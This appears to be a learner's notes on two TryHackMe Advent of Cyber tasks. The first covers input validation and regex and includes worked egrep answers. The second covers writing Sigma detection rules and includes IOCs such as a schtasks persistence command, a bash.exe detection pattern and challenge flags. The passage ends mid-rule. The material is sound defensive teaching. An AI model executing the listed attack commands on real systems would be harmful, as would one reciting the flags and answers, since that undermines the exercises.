+In this task, we will be exploring input validation in a more general sense before touching upon one of its most complex use cases: free-form text fields, followed by a quick discussion on how you may move forward in your secure coding journey beyond input validation.
+Input Validation Foundations
+Generally, an effective way to validate input is first to know how a specific piece of data is going to be processed by the rest of your application. The Day 15 task is a beautiful example that shows more or less the mindset required to be able to effectively tackle the specific case of Unrestricted File Upload.
+Data then goes through syntax and semantic validation checks to ensure that the user-provided values are both proper in their syntax (the answer follows the proper context asked by the question) and logical value (the values make sense for the question).
+Going back to Day 15:
+1.  You cannot  manually type your CV in the input field - the form asks for a file, so it’s simply not what’s being asked
+2.  You cannot just upload any file - it should follow a set of very specific rules, the implementation of which was all discussed in the latter parts of the task.
+Then comes whitelisting, where you can be very specific with what your forms would accept and immediately strip or even drop the ones that don’t fit in the predefined allowed category.
+HTML5 and Regex
+HTML5’s built-in features help a lot with the validation of user-provided input, minimizing the need to rely on JavaScript for the same objective. The `<input>` element, specifically has an array of very helpful capabilities centered around form validation.
+For instance, the `<input>` type, which can be set to specifically filter for an email, a URL, or even a file, among others, promptly checks whether or not the user-provided input fits the type of data that the form is asking for, and so, feedback on its validity is immediately returned to the user as a result.
+For even more granular control of the input being provided, regular expressions (regex) can be integrated into the mix. Simply use it in the "pattern" attribute within the `<input>` element, and you’re all set. [Here](https://www.regular-expressions.info/quickstart.html) is a nice resource to get started with regular expressions. A couple of examples are shown below.
+`1. <input type="text" id="uname" name="uname" pattern="[a-zA-Z0-9]+">   2. <input type="email" id="email" name="email" pattern=".+@tryhackme\.com">`
+The pattern in the first line of code above is easily one of the most foundational regular expression patterns one can use. The instruction here is to match any strings specifically composed of only letters and numbers - an alphanumeric pattern that is case-insensitive.
+The pattern in the second line of code above is a bit more pointed in its instruction, specifying that an email can have any characters at the beginning as long as it ends with "@tryhackme.com".
+Developing regular expressions can be very daunting as its nature is complex; however its capability to match very specific patterns is what makes it special. Well-built regular expressions introduce a great way to immediately filter out user-provided input that doesn't fit the specific requirements that you have set.
+Regex 101
+This section will talk about some regex tips to get you started. To match _any lowercase_ character from the English alphabet, the regex pattern is `[a-z]`. We can deconstruct it as follows:
+-   The square brackets indicate that you're trying to match _one character_ within the set of characters inside of them. For example, if we're trying to match any vowel of the English alphabet, we construct our regex as follows: `[aeiou]`. The order of the characters doesn't matter, and it will match the same.
+-   Square brackets can also accept a range of characters by adding a hyphen, as seen in our original example.
+-   You can also mix and match sets of characters within the bracket. `[a-zA-Z]` means you want to match any character from the English alphabet regardless of case, while `[a-z0-9]` means you want to match any lowercase alphanumeric character.
+We also need to talk about regex operators. The simplest one is the wildcard operator, denoted by `.` . This means regex will match _any_ character, and it's quite powerful when used with the operators `*`, `+`, and `{min,max}`. The asterisk or star operator is used if you don't care if the preceding token matches anything or not, while the plus operator is used if you want to make sure that it matches at least once. The curly braces operator, on the other hand, specifies the number of characters you want to match. Let's look at the following examples:
+-   To match a string that is alphanumeric and case insensitive, our pattern would be `[a-zA-Z0-9]+`. The plus operator means that we want to match a string, and we don't care how long it is, as long as it's composed of letters and numbers regardless of their case.
+-   If we want to ensure that the first part of the string is composed of letters and we want it to match regardless if there are numbers thereafter, it would be `^[a-zA-Z]+[0-9]*$`. The `^` and `$` operators are called anchors, and denote the start and end of the string we want to match, respectively. Since we wanted to ensure that the start of the string is composed of only letters, adding the caret operator is required.
+-   If we want to match just lowercase letters that are in between 3 and 9 characters in length, our pattern would be `^[a-z]{3,9}$`.
+-   If we want a string that starts with 3 letters followed by _any_ 3 characters, our pattern would be `^[a-zA-Z]{3}.{3}$`.
+There's also the concept of grouping and escaping, denoted by the `()` and the `\` operators, respectively. Grouping is done to manage the matching of specific parts of the regex better while escaping is used so we can match strings that contain regex operators. Finally, there's the `?` operator, which is used to denote that the preceding token is optional. Let's look at the following example:
+-   If we want to match both _www.tryhackme.com_ and _tryhackme.com_, our pattern would be `^(www\.)?tryhackme\.com$`. This pattern would also avoid matching _.tryhackme.com._
+-   `^(www\.)?`: The `^` operator marks the start of the string, followed by the grouping of www and the escaped `.`, and immediately followed by the question mark operator. The grouping allowed the question mark operator to work its magic, matching both strings with or without the _www._ at the beginning.
+-   `tryhackme\.com$`: The `$` operator marks the end of the string, preceded by the string tryhackme, an escaped `.`, and the string com. If we don't escape the `.` operator, the regex engine will think that we want to match any character between tryhackme and com as well.
+It's also imperative to note that the wildcard operator can lead to laziness and, consequently misuse. As such, it's always better to use character sets through the brackets especially when we're validating input as we want it to be perfect.
+Here's a table to summarize everything above:
+[]
+Character Set: matches any single character/range of characters inside
+.
+Wildcard: matches any character
+*
+Star / Asterisk Quantifier: matches the preceding token zero or more times
++
+Plus Quantifier: matches the preceding token one or more times
+{min,max}
+Curly Brace Quantifier: specifies how many times the preceding token can be repeated
+()
+Grouping: groups a specific part of the regex for better management
+\
+Escape: escapes the regex operator so it can be matched
+?
+Optional: specifies that the preceding token is optional
+^
+Anchor Beginning: specifies that the consequent token is at the beginning of the string
+$
+Anchor Ending: specifies that the preceding token is at the end of the string
+The Unique Case of Free-Form Text
+All of the techniques that we have covered in this task thus far are mainly concerned with structured data - data that we already expect what it should look like. However, compared to the validation of structured data, free text is more complex and not very straightforward.
+Structured data have inherent characteristics that allow us to set them apart quite quickly. For example, names shouldn’t consist of special characters (some names have, but these can be whitelisted), and age should only consist of numbers with an absolute maximum of 3 characters. Syntax and semantic validation checks can be immediately done on them, and the chaos suddenly doesn’t seem too bad.
+In contrast, free text fields are more free-for-all, and so validations checks are more limited, and the challenge of securing it is generally vaguer. Yet, like all great engineers before us, we power through these challenges and make the best with what we’re given. Listed below are some considerations to ponder on.
+-   First, we start again with the question of how this piece of data is going to be processed by the rest of the application.
+-   What will be the context for which this free-form text field will be used? Free text fields for blog posts are tackled very differently than text fields used for a small comment section or a descriptive text field.
+-   Is the free text field necessary for your business purposes in the first place, or could it be implemented differently while still achieving the same goal? This is essential to know, too, as part of writing secure code is avoiding writing vulnerable ones!
+Then we go to the tricky part. Since syntax and semantic checks are pretty much impossible due to the nature of free-form text fields, our best bet in having a bit of control is through whitelisting. This [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#validating-free-form-unicode-text) lists down the general techniques to perform whitelisting, which can be summarized as follows:
+1.  Ensure no invalid characters are present through proper encoding, and
+2.  Whitelist expected characters and character sets
+Best Remediation Tactic
+For the next part of the discussion, let’s take a look at the simple base code below wherein a programmer attempts to retrieve the usual details from a user.
+The example is a bit bare and would have been an immediate nightmare as it raises many alarms not only in terms of security, but also in terms of risking getting a ton of garbage responses. Since all of them are text inputs by default, the birthday and age fields may receive responses that aren’t within their specific context. Further, malicious users have free reign over the fields, essentially allowing them a free playground to tinker with.
+This is the case if no input validation is done at all. Let’s fix it up a bit and review it again.
+The changes above are literally just additions of the _type_ attribute and their corresponding values within the input element. Yet, there’s already a world of difference between this one and the base implementation prior. Take note that security wasn’t the main focus of these changes, yet it succeeds in mainly alleviating the chaos that the prior implementation otherwise invited. Going back to the discussion above, this is an example of the syntax check being done in the HTML layer.
+However, the implementation above is still susceptible to misuse, especially for very naughty users. Let’s fix it up further and review it again.
+The changes done above incorporate both semantic checking and whitelisting techniques to the existing syntax checking in the prior implementation in order to further filter out allowed values that can be provided in the input fields.
+1.  The name field, for instance, has been written to allow a maximum of 70 characters - still quite long but somewhat reasonable. This can further be filtered granularly by blacklisting numbers and special symbols, but for our purposes, let’s accept this one for now.
+2.  The date field is tweaked, so the earliest date it would allow is in the year 1900, while the latest date is in 2014, with the working assumption that the youngest user of the website would be eight years old.
+3.  The email field has also been revamped to only accept tryhackme emails, while the URL field is further narrowed down to only accept tryhackme rooms as the answer to the ‘favewebsite’ field.
+These semantic checks should follow the proper business context to be effective. For example, the implementation above is geared towards the tryhackme staff, marked by the email field only accepting tryhackme emails. Furthermore, applying the foundations of input validation not only ensures that the data being provided is proper, but it also drastically limits the attack surface of the input fields, especially those requiring structured data.
+This is the reason why we haven’t touched the `<textarea>` field at the very end of the code block. As discussed earlier, free-form text is unique in such a way that applying syntax and semantic checks are pretty much impossible. In order to secure this one, we would first need to define what content (e.g. characters, character sets, symbols, etc.) is acceptable and then perform the actual whitelisting. Even then, it wouldn’t be enough as it’s still a very open field, and so techniques such as output escaping and using parametrized queries, among others, should be implemented as well.
+Client-side vs Server-side
+Our discussion until this point has been geared towards using input validation to ensure that the pieces of data that we're getting from the users are not garbage. Proper input validation on the client-side limits misuse and minimizes the attack surface of the application, however, it doesn't actively cover malicious use cases.
+As opposed to the above examples of validating input implemented on the client-side, output escaping and using parametrized queries are implemented on the server-side, adding computational load to the server, but ultimately helping in securing the application as a whole. This is done as an exercise of inherent distrust in the user-provided input despite validation.
+The example below uses the built-in `htmlentities()` PHP function to escape any character that can affect the application.
+`$name = htmlentities($_GET['name'], ENT_QUOTES | ENT_HTML5, "UTF-8")`
+On the other hand, the one below uses the HTMLPurifier library to help with some use cases, such as our `<textarea>` conundrum above.
+Both examples are done on the server-side to escape characters and purify content, respectively both effective ways to prevent user misuse and XSS attacks. Implementing both client and server-side validations ensure that no stones are left unturned.
+This exact case highlights the importance of layering defenses and shows point-blank the limitation of client-side input validation. It also gives rise to the notion that input validation is not a one-stop shop for securing your application.
+Specific cases warrant specific security requirements, and so on this factor alone, it’s already apparent that there exist multiple ways of attacking the challenge of securing user-provided input, and most of the time, they are implemented on top of each other.
+Not All Solutions are Equal
+Input validation is an important layer of security that all production-level applications should have. However, no matter how ‘perfect’ your input validation is for your specific use case, there simply are limitations to all kinds of security implementations - and input validation is not exempt from it.
+You cannot make your application fully XSS-proof through input validation alone. Controls may be put in place at the input level that may lessen the attack surface of the application, but it doesn’t fully remediate it. Full remediation of an XSS vulnerability in your application requires additional layers of defenses, such as mitigation on the browser-level (via secure cookies, content-security-policy headers, etc.) and escaping and purifying user-provided input.
+In light of these remediation techniques, it makes sense to tackle each challenge on its own - SQL and LDAP-related vulnerabilities are addressed differently from XSS, so why try to fit them all in the same formula?
+Summary
+Despite being a very important security control, due diligence in securing applications involving user-provided input should not stop in validating the input per se. As seen in previous examples, user input may be valid, but it doesn’t necessarily mean that it’s harmless.
+There are a lot of tools and frameworks out there that when used properly can help secure your application. For instance, HTML5's features can help in minimizing input form misuse, while the use of regular expressions can help filter out what we need from the user more granularly. We took a closer look at regex here especially because of its powerful capability to implement filters.
+And while the above examples aren't directly concerned about application security, they help minimize the attack surface of the application, which is further tackled through server-side validation techniques such as output escaping and using parametrized queries.
+We should be realistic and not try to solve all security problems with input validation. There is not one control that could prevent persistent malicious actors and so layering these controls is the better way to move forward.
+Exercise
+We have prepared a regex exercise that you can access through the machine provided. First, let's start the Virtual Machine by pressing the Start Machine button at the top of this task. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.
+To practice your regex, first, change your working directory to the RegExPractice folder using the command: `cd ~/Desktop/RegExPractice` then, you may either use _egrep_ via the following syntax: `egrep 'regex_pattern_here' strings`, or the _regex_checker.py_ script written for you via python: `python3 regex_checker.py`.
+We are aware that some structured data are more complex than others, so we have set a specific syntax you may follow to make the exercise simpler. Have fun!
+-   Filtering for Usernames: Alphanumeric, minimum of 6 characters, maximum of 12 characters, may consist of upper and lower case letters.
+Filtering for Emails: Follows the form "local-part@domain" (without quotation marks); local-part is a random string, and the domain is in the form of "<domain name>.tld". All top-level domains (tld) are ".com"
+-   Filtering for URLs: Starts with either http or https; some of the URLs have "www", and a TLD should exist.
+Answer the questions below
+Filtering for Usernames: How many usernames fit the syntax above?
+This regex can be seen in one of the examples in the task, marked as 'one of the most foundational regex patterns'. Minimum and maximum characters are done as "{min,max}"
+```text
+┌──(kali㉿kali)-[~]
+└─$ egrep [a-z] jesus.txt
+hi :0
+
+ubuntu@tryhackme:~/Desktop/RegExPractice$ ls
+regex_checker.py  strings
+ubuntu@tryhackme:~/Desktop/RegExPractice$ cat regex_checker.py 
+import re
+
+f = open('strings').readlines()
+
+regex = input("Enter your regex here: ")
+
+for i in f:
+    i = i.strip()
+    x = re.match(regex, i)
+    if x:
+        print(x.string)
+
+ubuntu@tryhackme:~/Desktop/RegExPractice$ more strings 
+user3
+5qdskyjg@8a8chgb
+h7tvud9o2l0uzwn
+http://www.sample.net/blood?ghost=force
+armandslush@.com
+http://keebler.com/dicta-tempore-id-dolores-blanditiis-ut.html
+s3au4cpc1qjs.09ev
+63vcb0d2oc0.9bi
+v9ouvq79l1jtm3uoed
+www.website
+br33zy@gmail.com
+ijx1fkz9u5pemgc
+lewisham44@amg.com
+vtxhza6esiul005@7py
+4hyvesv0tf62mnh9fe07
+9z8yMc9T
+d22y.
+no74cc06xnqir4gqf8
+vsch@h@r7mijxuowyw@p
+z2bwmmnyd67iqu1qkp
+s4xuoekxgglivtb7p9afy1mlve
+31337aq
+k1p5xwxy@jzxxhhsl
+http://schindler
+3czbscctm@86w5j
+o.55k6v.9t26k2.@
+al15v26jnjlse7at08@.5oj3e4
+be6@0etyl9ouqsf243sd
+sample.com
+4exde
+i5uwr1vobbi7q3fet6
+kc@f1ehynf6ctv0t
+5o@g6
+johnny.walker.org
+nr@rq@1tdz93uoa@f37wj9dqih
+nk4zhp1wuki0qwkos
+uestqs2brz4us5d2hdx5d7c90j
+m6uc3unrmpyu8t45e
+example.io
+c2v@gdo0@abie1i2dn2p
+http://koch.com/quae-perspiciatis-non-unde-quo
+7a.vv
+9l87o4exdemy7rbgd.51
+97mmqn48bsdbi3lo1mj@m2ocljr13u
+johnny.the.sinner@yahoo.com
+.vpll
+http://johns.net/nisi-quis-dolorum-et-rerum
+hgqpiledh86ujj2
+https://www.sample.edu/#fire
+.g20o9pgdy15@bcn75
+s4xuoekxgglivtb7p9afy1mlve
+ffcmd.d.6zrqty1m9gz9d5dh3d02fj
+po77w@j5t9.5zhe1o
+627hhn1sw4isms7234t5b6ifsu9k3v
+qetpfjy1apterewf@c8ao4yde7
+badyeti@gmail.com
+
+http://www.sample.info/?mint=trouble&action=move
+2lhd4d8bu4v9cbuwjv
+10mncmcvkc.xuwovtahx0sfb0fhzu5
+https://www.sample.org/?quiet=expansion&grip=eggnog
+maxximax@fedfull.com
+13ct9ojbv90trzhc7b
+http://spencer.com/sapiente-tempore-omnis-a-est-aut-atque-pariatur
+e0sky4hwov2evkilz1
+3pxgl1jbd.v4m3cl
+http://pfeffer.biz/nulla-non-facilis-incidunt-necessitatibus-velit-inventore
+s8x1e66f@ee4p@juw
+nr@rq@1tdz93uoa@f37wj9dqih
+rt9huu7j2353luuzetm0
+z1.6g41@4ph@ak83@8qra1eqi.1kxh
+b6asr
+szlfevrg2ggwhlp6
+@.owmiq@i2@h6bl
+mc32y02v@5g445syrk
+4kertjmxm57g@hueph3
+zbgdu8mjgy0.edcra0dn
+https://www.kertzmann.com/possimus-ullam-consequatur-itaque-sed-modi-aliquam
+5c3if.81b28os68
+2hqbiriutgn7zc966k6
+jklabada@tryhackme.com
+https://www.sample.com/?air=color&cave=judge#shake
+i6b0en15.qipjkdj8
+juz19rrhr.27od9ra5chtgt354
+ka17p8jg6wfl17m
+user1
+http://schinner.com/quia-vitae-qui-explicabo-provident-minima-ratione.html
+39C3qxP
+kza.22xo7nauzmwck4t
+tml43z.tr30xwnknm7i
+l40hqgyo6n0o@ao8m
+dogkramer@yahoo.c0m
+wau415etojg.y2dfjpqc0f9zl6
+9mtw47nr.8o5txegyk
+c8or9
+R6fUTY2nC8
+ww81vu953pm1k83x
+4qi7co2.rwto7um7
+4nlrvusw5..ogfdj
+soc7c
+johnny.the.sinner@yahoo.com
+psoa.il0n@e3iq7
+ux6pez3jom6z4661d
+a1ayccdpodbselw
+o0gclxk6lgun1k@wz6va
+https://runolfsson.com/esse-ab-rerum-et-quis-aut.html
+6zvknvh25xdws1dq
+9Qe5f4
+.o2isyoa.s64uh5vhf6
+raymond.reyes@gma1l.coom
+.u5ah7pgzfgyirut194
+https://www.moen.com/explicabo-exercitationem-culpa-et-eum-temporibus
+https://horse.sample.com/shape/company?mom=collar#donkey
+qetpfjy1apterewf@c8ao4yde7
+hunter4k@canary.com
+vvj74a2535hua5uttoud1tpx595abs
+User35
+gtywur3k63s48u0.wmo
+hussain.volt@hotmail.com
+u3Y73h3
+hfqrf
+http://batz.com/reprehenderit-voluptate-id-soluta-tenetur
+jason.delsey@yahoo
+uestqs2brz4us5d2hdx5d7c90j
+eqw8w687b07db2ne4x0t
+marckymarc@tryhackme.com
+5Xze553j
+wau415etojg.y2dfjpqc0f9zl6
+3q8n@
+np2r7itbu7kbprjkj.p1d88h@h..km
+al15v26jnjlse7at08@.5oj3e4
+3w31vfewpmlq3z6m
+14rd72483@8km2kvx
+p7ffnamx1aszwtw4.95i
+d3q5tfi6cg09wru1ydc
+s0k4oraf9jtg165ld97
+juz19rrhr.27od9ra5chtgt354
+batteryvoltas@alfa.com
+
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^[a-zA-Z0-9]{6,12}$' strings 
+9z8yMc9T
+31337aq
+39C3qxP
+R6fUTY2nC8
+9Qe5f4
+User35
+u3Y73h3
+5Xze553j
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^[a-zA-Z0-9]{6,12}$' strings | wc -l
+8
+```
+*8*
+Filtering for Usernames: One username consists of a readable word concatenated with a number. What is it?
+*User35*
+Filtering for Emails: How many emails fit the syntax above?
+Regex may use the wildcard "." followed by "+" to match random strings. In order to match a dot, it needs to be escaped, i.e. "\."
+```text
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^.+@.+\.com$' strings  
+br33zy@gmail.com
+lewisham44@amg.com
+johnny.the.sinner@yahoo.com
+badyeti@gmail.com
+maxximax@fedfull.com
+jklabada@tryhackme.com
+johnny.the.sinner@yahoo.com
+hunter4k@canary.com
+hussain.volt@hotmail.com
+marckymarc@tryhackme.com
+batteryvoltas@alfa.com
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^.+@.+\.com$' strings | wc -l
+11
+```
+*11*
+Filtering for Emails: How many unique domains are there?
+*8*
+Filtering for Emails: What is the domain of the email with the local-part "lewisham44"?
+*amg.com*
+Filtering for Emails: What is the domain of the email with the local-part "maxximax"?
+*fedfull.com*
+Filtering for Emails: What is the local-part of the email with the domain name "hotmail.com"?
+```text
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^.+@.+\.com$' strings |  grep 'hotmail'
+hussain.volt@hotmail.com
+```
+*hussain.volt*
+Filtering for URLs: How many URLs fit the syntax provided?
+An optional character / set of characters may be matched by putting "?" after them. Characters can be grouped by putting them inside parentheses.
+```text
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep 'http(s)?.+\.' strings | wc -l
+16
+
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep 'http(s)?.+\.' strings        
+http://www.sample.net/blood?ghost=force
+http://keebler.com/dicta-tempore-id-dolores-blanditiis-ut.html
+http://koch.com/quae-perspiciatis-non-unde-quo
+http://johns.net/nisi-quis-dolorum-et-rerum
+https://www.sample.edu/#fire
+http://www.sample.info/?mint=trouble&action=move
+https://www.sample.org/?quiet=expansion&grip=eggnog
+http://spencer.com/sapiente-tempore-omnis-a-est-aut-atque-pariatur
+http://pfeffer.biz/nulla-non-facilis-incidunt-necessitatibus-velit-inventore
+https://www.kertzmann.com/possimus-ullam-consequatur-itaque-sed-modi-aliquam
+https://www.sample.com/?air=color&cave=judge#shake
+http://schinner.com/quia-vitae-qui-explicabo-provident-minima-ratione.html
+https://runolfsson.com/esse-ab-rerum-et-quis-aut.html
+https://www.moen.com/explicabo-exercitationem-culpa-et-eum-temporibus
+https://horse.sample.com/shape/company?mom=collar#donkey
+http://batz.com/reprehenderit-voluptate-id-soluta-tenetur
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep 'https.+\.' strings 
+https://www.sample.edu/#fire
+https://www.sample.org/?quiet=expansion&grip=eggnog
+https://www.kertzmann.com/possimus-ullam-consequatur-itaque-sed-modi-aliquam
+https://www.sample.com/?air=color&cave=judge#shake
+https://runolfsson.com/esse-ab-rerum-et-quis-aut.html
+https://www.moen.com/explicabo-exercitationem-culpa-et-eum-temporibus
+https://horse.sample.com/shape/company?mom=collar#donkey
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep 'https.+\.' strings | wc -l
+7
+```
+*16*
+Filtering for URLs: How many of these URLs start with "https"?
+*7*
+If you feel like you could use more fundamental skills in your life, try the [Linux Fundamentals](https://tryhackme.com/module/linux-fundamentals) module. All rooms are free in that one!
+### [Day 18] Sigma Lumberjack Lenny Learns New Rules
+The Story
+Check out Cybrites' video walkthrough for Day 18 [here](https://www.youtube.com/watch?v=4Zqd_FlkEu8)!
+Compromise has been confirmed within the Best Festival Company Infrastructure, and tests have been conducted in the last couple of weeks. However, Santa’s SOC team wonders if there are methodologies that would help them perform threat detection faster by analysing the logs they collect. Elf McSkidy is aware of Sigma rules and has tasked you to learn more and experiment with threat detection rules.
+### Threat Detection
+Cyber threats and criminals have advanced tactics to ensure that they steal information and cause havoc. As you have already seen through the previous days, there are many ways in which this can be done. There are also ways for security teams to prepare their defences and identify these threats. What would be evident is that most of the blue-team activities will require proactive approaches to analysing different logs, malware and network traffic. This brings about the practice of threat detection.
+Threat detection involves proactively pursuing and analysing abnormal activity within an ecosystem to identify malicious signs of compromise or intrusion within a network.
+### Attack Scenario
+Elf McBlue obtained logs and information concerning the attack on the Best Festival Company by the Bandit Yeti. Through the various analysis of the previous days, it was clear that the logs pointed to a likely attack chain that the adversary may have followed and can be mapped to the Unified Kill Chain. Among the known phases of the UKC that were observed include the following:
+-   **Persistence**: The adversary established persistence by creating a local user account they could use during their attack.
+-   **Discovery**: The adversary sought to gather information about their target by running commands to learn about the processes and software on Santa’s devices to search for potential vulnerabilities.
+-   **Execution**: Scheduled jobs were created to provide an initial means of executing malicious code. This may also provide them with persistence or be part of elevating their privileges.
+The attack chain report included indicators of compromise (IOCs) and necessary detection parameters, as listed below. Additionally, the attack techniques have been linked to the MITRE ATT&CK framework for further reading.
+Attack Technique
+Indicators of Compromise
+Required Detection Fields
+[Account Creation](https://attack.mitre.org/techniques/T1136/)
+-   EventID: 4720
+-   Service: Security
+-   Service
+-   EventID
+[Software Discovery](https://attack.mitre.org/techniques/T1518/)
+-   Category: Process Creation
+-   EventID: 1
+-   Service: Sysmon
+-   Image: C:\Windows\System32\reg.exe
+-   CommandLine: `reg query “HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer” /v svcVersion`
+-   Category
+-   EventID
+-   Image
+-   CommandLine strings
+[Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
+-   Category: Process Creation
+-   EventID: 1
+-   Service: Sysmon
+-   Image: C:\Windows\System32\schtasks.exe
+-   Parent Image: C:\Windows\System32\cmd.exe
+-   CommandLine: `schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"`
+-   Category
+-   EventID
+-   Image
+-   CommandLine strings
+Before we proceed to the next section, deploy the attached machine and give it up to 5 minutes to launch its services. Once launched, use the AttackBox or VPN to access the link [http://MACHINE_IP](http://machine_ip/) to our Sigma application, which constitutes the following features:
+-   **Run** - Submit your Sigma rule and see if it detects the malicious IOC.
+-   **Text Editor** - Write your Sigma rule in this section.
+-   **Create Rule** - Create a Sigma rule for the malicious IOC.
+-   **View Log** - View the log details associated with the malicious IOC.
+### Chopping Logs with Sigma Rules
+Sigma is an open-source generic signature language developed by Florian Roth & Thomas Patzke to describe log events in a structured format. The format involves using a markup language called [YAML](http://yaml.org/), a designed syntax that allows for quick sharing of detection methods by security analysts. The common factors to note about YAML files include the following:
+-   YAML is case-sensitive.
+-   Files should have the `.yml` extension.
+-   Spaces are used for indentation and not tabs.
+-   Comments are attributed using the `#` character.
+-   Key-value pairs are denoted using the colon `:` character.
+-   Array elements are denoted using the dash `-` character.
+Sigma makes it easy to perform content matching based on collected logs to raise threat alerts for analysts to investigate. Log files are usually collected and stored in a database or a Security Information and Event Management (SIEM) solution for further analysis. Sigma is vendor-agnostic; therefore, the rules can be converted to a format that fits the target SIEM.
+Sigma was developed to satisfy the following scenarios:
+-   To make detection methods and signatures shareable alongside IOCs and Yara rules.
+-   To write SIEM searches that avoid vendor lock-in.
+-   To share signatures with threat intelligence communities.
+-   To write custom detection rules for malicious behaviour based on specific conditions.
+### Sigma Rule Syntax
+Let’s use the first attack step challenge to define the syntax requirements, fill in the details into our skeletal rule, and detect the creation of local accounts. Use the text editor section of the SigHunt application to follow along.
+-   **Title:** Names the rule based on what it is supposed to detect.
+-   **ID:** A globally unique identifier that the developers of Sigma mainly use to maintain the order of identification for the rules submitted to the public repository, found in UUID format.
+-   **Status:** Describes the stage in which the rule maturity is at while in use. There are five declared statuses that you can use:
+-   _Stable_: The rule may be used in production environments and dashboards.
+-   _Test_: Trials are being done to the rule and could require fine-tuning.
+-   _Experimental_: The rule is very generic and is being tested. It could lead to false results, be noisy, and identify exciting events.
+-   _Deprecated_: The rule has been replaced and would no longer yield accurate results.
+-   _Unsupported_: The rule is not usable in its current state (unique correlation log, homemade fields).
+-   **Description:** Provides more context about the rule and its intended purpose. Here, you can be as detailed as possible to provide information about the detected activity.
+local_account_creation.yml
+```shell-session
+title: Suspicious Local Account Creation
+id: 0f06a3a5-6a09-413f-8743-e6cf35561297 
+status: experimental
+description: Detects the creation of a local user account on a computer.
+```
+-   **Logsource:** Describes the log data to be used for the detection. It consists of other optional attributes:
+-   _Product_: Selects all log outputs of a certain product. Examples are Windows, Apache
+-   _Category_: Selects the log files written by the selected product. Examples are firewalls, web, and antivirus.
+-   _Service_: Selects only a subset of the logs. Examples are _sshd_ on Linux or _Security_ on Windows.
+-   _Definition_: Describes the log source and its applied configurations.
+local_account_creation.yml
+```shell-session
+logsource:
+  product: windows
+  service: security
+```
+-   **Detection:**  A required field in the detection rule describes the parameters of the malicious activity we need an alert for. The parameters are divided into two main parts:
+-   _The search identifiers_ are the fields and values the detection should search for.
+-   _The condition expression_ - sets the action to be taken on the detection, such as selection or filtering. The critical thing to look out for account creation on Windows is the Event ID associated with user accounts. In this case, Event ID: 4720 was provided for us on the IOC list, which will be our search identifier.
+local_account_creation.yml
+```shell-session
+detection:
+  selection:
+    EventID:  # This shows the search identifier value
+      - 4720    # This shows the search's list value
+  condition: selection
+```
+The search identifiers can be enhanced using different modifiers appended to the field name with the pipe character `|`. The main type of modifiers are known as **Transformation modifiers** and comprise the values: _contains_, _endswith_, _startswith_, and _all_. Some of these modifiers will be vital in writing rules against the other IOCs.
+random_rule.yml
+```shell-session
+detection:
+  selection:
+    Image|endswith:
+      - '\svchost.exe'
+    CommandLine|contains|all: 
+      - bash.exe
+      - '-c '   
+  condition: selection
+```
+-   **FalsePositives:** A list of known false positives that may occur based on log data.
+-   **Level:** Describes the severity with which the security team should take the activity under the written rule. The attribute comprises five levels: Informational -> Low -> Medium -> High -> Critical
+-   **Tags:** Adds information that can be used to categorise the rule. Common tags are associated with tactics and techniques from the MITRE ATT&CK framework. Sigma developers have defined a list of [predefined tags](https://github.com/SigmaHQ/sigma/wiki/Tags).
+local_account_creation.yml
+```shell-session
+falsepositives: 
+    - unknown
+level: low
+tags:
+   - attack.persistence # Points to the MITRE Tactic
+   - attack.T1136.001 # Points to the MITRE Technique
+```
+Voila!! We have written our first Sigma rule and can run it on the AoC Sigma Hunting application to see if we can get a match. As mentioned before, Sigma rules are converted to fit the desired SIEM query, and in our case, it should be known that they are being transformed into Elastic Queries on the backend. Various resources perform this task, with the native tool being [Sigmac](https://github.com/SigmaHQ/sigma/blob/master/tools/README.md), which is being deprecated and replaced with a more stable python library, [pySigma](https://github.com/SigmaHQ/pySigma). Another notable tool to check out is [Uncoder.io](https://uncoder.io/). Uncoder.IO is an open-source web Sigma converter for numerous SIEM and EDR platforms. It is easy to use as it allows you to copy your Sigma rule on the platform and select your preferred backend application for translation.
+### Activity
+Equipped with the knowledge about Sigma rules, your task is to complete the remaining two challenges by writing rules corresponding to the attack chain phases and IOCs. Santa is relying on you to beef up his security against adversaries attempting to stop Christmas this year. As a reminder, the required fields for the attacks are below:
+-   **Software Discovery**: Category, EventID, Image, CommandLine.
+-   **Scheduled Jobs**: Category, EventID, Image, CommandLine.
+Answer the questions below
+What is the Challenge #1 flag?
+```sigma rule
+title: local Account Creation Detection
+id: 1 # UUID
+status: experimental # experimental, test, stable, deprecated, unsupported.
+description: This rule will detect when an account is created
+author: witty
+modified: 1
+
+logsource: # Outlines target source of the logs based on operating system, service being run, category of logs.
+  product: windows # windows, linux, macos.
+  service: security # sshd for Linux, Security for Windows, applocker, sysmon.
+  category: # firewall, web, antivirus, process_creation, network_connection, file_access.
+detection:
+  selection:
+    EventID: 4720 # Change me
+
+  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.
+
+falsepositives: # Legitimate services or use.
+
+level:  # informational, low, medium, high or critical.
+
+tags: # Associated TTPs from MITRE ATT&CK
+  - {attack.tactic} # MITRE Tactic
+  - {attack.technique} # MITRE Technique 
+
+Successfully detected Suspicious Local Account Creation. Here is your flag - THM{n0t_just_your_u$ser}
+```
+![[Pasted image 20221221165340.png]]
+![[Pasted image 20221221165400.png]]
+From the Challenge 1 log, what user account was created?
+*BanditYetiMini*
+What is the Challenge #2 flag?
+```text
+title: Software Discovery Detection
+id: 2 # UUID
+status: experimental # experimental, test, stable, deprecated, unsupported.
+description: This rule will detect software enumeration commands
+author: witty
+modified: 1
+
+logsource: # Outlines target source of the logs based on operating system, service being run, category of logs.
+  product: windows # windows, linux, macos.
+  service: sysmon # sshd for Linux, Security for Windows, applocker, sysmon.
+  category: process_creation # firewall, web, antivirus, process_creation, network_connection, file_access.
+detection:
+  selection:
+    EventID:  # Change me
